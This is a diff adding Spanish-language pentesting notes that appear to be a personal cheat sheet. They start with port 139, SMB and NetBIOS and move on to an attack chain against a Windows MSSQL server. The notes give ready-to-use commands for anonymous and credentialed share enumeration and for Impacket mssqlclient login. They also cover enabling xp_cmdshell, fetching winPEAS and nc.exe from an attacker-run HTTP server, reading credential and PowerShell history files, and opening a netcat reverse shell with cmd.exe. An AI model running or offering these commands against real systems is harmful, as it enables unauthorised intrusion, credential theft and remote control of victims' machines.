@@ -1,0 +1,164 @@
+📌 Es el puerto del protocolo SMB (Server Message Block) en Windows.
+
+    NetBIOS (Network Basic Input/Output System) es un sistema que permite a equipos Windows:
+
+        📂 Compartir archivos
+        🖨️ Compartir impresoras
+        👤 Autenticación en red
+        🔐 Comunicación en Active Directory
+
+    En redes modernas suele funcionar sobre TCP/IP.
+
+⚙️ ¿Qué hace el puerto 139?
+
+    Comparticiones SMB antiguas
+    Redes Windows previas a Windows 2000
+
+    Se usa para: 
+
+        Acceder a \\SERVIDOR\Compartida
+        Montar una carpeta en red
+        Comunicación entre equipos en dominio
+
+🔐 En ciberseguridad
+
+    Si el puerto 139 está abierto:
+
+        Indica sistema Windows
+        Puede permitir enumeración de recursos compartidos
+        Puede revelar usuarios y nombres de máquina
+        Puede usarse para ataques SMB antiguos
+
+    ⚠️ Si está expuesto a Internet → mala práctica.
+
+🧪 En pentesting
+
+    Se revisa junto a:
+
+        135 (RPC)
+        445 (SMB)
+        88 (Kerberos)
+        389 (LDAP)
+
+
+🎯 Ejemplo de uso
+
+    Fuerza Bruta
+
+        Listado recursos con acceso anónimo
+
+            smbclient -L //<IP> -N
+
+        Listado recursos con acceso Administrator
+
+            smbclient -L //<IP> -U Administrator
+
+                -L > Listar los posibles shares
+                -U > Usuario > Administrador suele ser el genérico en Windows.
+
+        Acceso a un recurso mediante acceso anónimo
+
+            smbclient //<IP>/<RECURSO> -N
+
+    Con SMBMAP 
+
+        Acceso con usuario y contraseña	        
+
+            smbmap -H <IP> -u 'a' -p 'a'
+
+    🖥️ Acceso utilizando la herremienta Impacket
+
+        · Para mostrar los comandos posibles: 
+
+            mssqlclient.py
+
+        · Entrar en el sistema con mssqlclient:
+
+            mssqlclient.py <DOMAIN>/<USER>@<IP> -windows-auth
+
+        · Entrar en el sistema con contraseña y con mssqlclient:
+
+            mssqlclient.py <DOMAIN>/<USER>:<PASS>@<IP> -windows-auth    
+
+        · Para verificar si el usuario actual pertenece al rol de servidor sysadmin
+        
+            SELECT is_srvrolemember('sysadmin');
+			
+        · Ver las tablas que hay en la BBDD del sistema
+
+            SELECT name from sys.databases
+
+        · Para utilzar comandos remotamente en ms-sql server
+	
+            EXEC xp_cmdshell 'dir *.exe';
+
+            Configuración de la Command Shell
+
+                EXEC sp_configure 'show advanced options', 1; 
+                RECONFIGURE								
+                sp_configure (en función del error que nos de)						
+                EXEC sp_configure 'xp_cmdshell', '1'								
+                RECONFIGURE	
+
+        · Para ver quien es el usuario
+		
+            xp_cmdshell "whoami"
+
+    🖥️ Acceso utilizando la herremienta WinPeas						
+									
+        · Ver ejecutables
+		
+            winpeas --help	
+												   		
+        · Encendemos el servidor, en la ruta donde se encuentra winPEAS
+		
+            python3 -m  http.server 	
+
+        · Usar PowerShell para inyectar el script (saldrá un código 200 en el servidor anterior)
+		
+            EXEC xp_cmdshell 'powershell.exe wget http://<IP_USER>:8000/winPEASx64.exe -OutFile c:\\Users\Public\\winPEASx64.exe';	
+
+        · Ejecutar el script que hemos subido
+		
+            EXEC xp_cmdshell 'c:\\Users\Public\\winPEASx64.exe';	
+
+        · Buscar algo específico y que lo muestre
+		
+            EXEC xp_cmdshell 'c:\\Users\\Public\\winPEASx64.exe | findstr /i "<SEARCH>"'; 
+
+            EXEC xp_cmdshell 'powershell.exe cat <UBICACION_CREDENCIALES>';
+            EXEC xp_cmdshell 'powershell.exe cat C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt';
+
+    🖥️ Reverse Shell
+
+        · Comprobar si existe el directorio
+		
+            EXEC xp_cmdshell 'dir C:\Users\Public\';
+
+        · Si queremos hacer una prueba y subir un fichero de prueba, introducimos el siguiente comando: 
+
+            EXEC xp_cmdshell 'echo hola > C:\Users\Public\prueba.txt';
+
+        · Hay que inyectar el fichero nc.exe, para ello se descarga de la siguiente ruta: 
+
+            https://eternallybored.org/misc/netcat/
+
+        · Ejecutar el servidor (en la ubicación donde se encuentre el fichero nc.exe)
+		
+            python3 -m http.server 80
+
+        · Inyectar el ejecutable (siempre en la misma ruta)
+		
+            EXEC xp_cmdshell "powershell -c Invoke-WebRequest 'http://<IP_USER>/nc.exe' -OutFile 'C:\Users\Public\nc.exe'";
+
+        · Abrir puerto (Listener, en otra terminal)
+		
+            nc -lvnp 9999
+
+        · Hacer la reverse Shell (dentro de la máquina víctima)
+		
+            EXEC xp_cmdshell " C:\Users\Public\nc.exe <IP_USER> 9999 -e cmd.exe";
+
+        · Si todo ha ido bien, tendremos conexión modo administrador
+		
+            psexec.py <DOMAIN_NAME>/<ROOT_USER>@<IP_MÁQUINA>
